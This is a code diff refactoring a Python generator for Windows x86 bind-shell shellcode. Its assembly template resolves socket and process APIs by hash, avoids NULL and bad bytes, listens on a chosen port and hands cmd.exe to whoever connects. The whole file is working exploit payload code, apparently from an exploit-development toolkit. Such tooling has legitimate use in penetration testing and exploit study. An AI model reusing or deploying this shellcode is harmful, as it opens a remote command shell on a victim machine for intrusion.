@@ -1,24 +1,18 @@
-from coder.util import (
-    call_exit_func,
-    convert_port_hex,
-    find_and_call,
-    find_hash_key,
-    push_hash,
-    push_string,
-)
+from coder import call_exit_func, find_and_call
+from coder.util import convert_port_hex, find_hash_key, push_hash, push_string
 
 
 def generate(port, bad_chars, exit_func, debug=False):
     port_hex = convert_port_hex(port)
     hash_key = find_hash_key(
         [
-            "LoadLibraryA",
-            "WSAStartup",
-            "WSASocketA",
-            "bind",
-            "listen",
-            "accept",
-            "CreateProcessA",
+            ("KERNEL32.DLL", "LoadLibraryA"),
+            ("WS2_32.DLL", "WSAStartup"),
+            ("WS2_32.DLL", "WSASocketA"),
+            ("WS2_32.DLL", "bind"),
+            ("WS2_32.DLL", "listen"),
+            ("WS2_32.DLL", "accept"),
+            ("KERNEL32.DLL", "CreateProcessA"),
         ]
         + ([exit_func] if exit_func else []),
         bad_chars,
@@ -30,12 +24,12 @@ def generate(port, bad_chars, exit_func, debug=False):
         mov   ebp, esp
         add   esp, 0xfffff9f0           // Avoid NULL bytes
 
-    {find_and_call(hash_key)}
+    {find_and_call.generate(hash_key)}
 
     load_ws2_32:                        // HMODULE LoadLibraryA([in] LPCSTR lpLibFileName);
-        {push_string('ws2_32.dll', bad_chars)}
+        {push_string('WS2_32.DLL', bad_chars)}
         push  esp                       // lpLibFileName = &("ws2_32.dll")
-        {push_hash('LoadLibraryA', hash_key)}
+        {push_hash('KERNEL32.DLL', 'LoadLibraryA', hash_key)}
         call dword ptr [ebp+0x04]       // Call LoadLibraryA
 
     call_wsastartup:                    // int WSAStartup(WORD wVersionRequired, [out] LPWSADATA lpWSAData);
@@ -47,7 +41,7 @@ def generate(port, bad_chars, exit_func, debug=False):
         xor   eax, eax                  // EAX = 0
         mov   ax, 0x0202                // Move version to AX
         push  eax                       // wVersionRequired = 0x202
-        {push_hash('WSAStartup', hash_key)}
+        {push_hash('WS2_32.DLL', 'WSAStartup', hash_key)}
         call dword ptr [ebp+0x04]       // Call WSAStartup
 
     call_wsasocketa:                    // SOCKET WSAAPI WSASocketA([in] int af, [in] int type, [in] int protocol, [in] LPWSAPROTOCOL_INFOA lpProtocolInfo, [in] GROUP g, [in] DWORD dwFlags)
@@ -61,7 +55,7 @@ def generate(port, bad_chars, exit_func, debug=False):
         push  eax                       // type = 0x1
         inc   eax                       // Increase EAX, EAX = 0x02
         push  eax                       // af = 0x2
-        {push_hash('WSASocketA', hash_key)}
+        {push_hash('WS2_32.DLL', 'WSASocketA', hash_key)}
         call dword ptr [ebp+0x04]       // Call WSASocketA
         mov   esi, eax                  // esi = sock
 
@@ -83,14 +77,14 @@ def generate(port, bad_chars, exit_func, debug=False):
         push  eax                       // namelen = 0x10
         push  edi                       // addr = &(sockaddr_in)
         push  esi                       // s = sock
-        {push_hash('bind', hash_key)}
+        {push_hash('WS2_32.DLL', 'bind', hash_key)}
         call dword ptr [ebp+0x04]       // Call bind
 
     call_listen:                        // int WSAAPI listen([in] SOCKET s, [in] int backlog)
         xor   eax, eax                  // eax = 0
         push  eax                       // backlog = 0
         push  esi                       // s = sock
-        {push_hash('listen', hash_key)}
+        {push_hash('WS2_32.DLL', 'listen', hash_key)}
         call dword ptr [ebp+0x04]       // Call listen
 
     call_accept:                        // SOCKET WSAAPI accept([in] SOCKET s, [out] sockaddr *addr, [in, out] int *addrlen)
@@ -98,7 +92,7 @@ def generate(port, bad_chars, exit_func, debug=False):
         push  eax                       // addrlen = 0
         push  eax                       // addr = 0
         push  esi                       // s = sock
-        {push_hash('accept', hash_key)}
+        {push_hash('WS2_32.DLL', 'accept', hash_key)}
         call dword ptr [ebp+0x04]       // Call accept
         mov   esi, eax                  // esi = accept()
 
@@ -140,8 +134,8 @@ def generate(port, bad_chars, exit_func, debug=False):
         push  eax                       // lpProcessAttributes = NULL
         push  ebx                       // lpCommandLine = &("cmd.exe")
         push  eax                       // lpApplicationName = NULL
-        {push_hash('CreateProcessA', hash_key)}
+        {push_hash('KERNEL32.DLL', 'CreateProcessA', hash_key)}
         call dword ptr [ebp+0x04]       // Call CreateProcessA
 
-    {call_exit_func(exit_func, hash_key)}
+    {call_exit_func.generate(exit_func, hash_key)}
     """
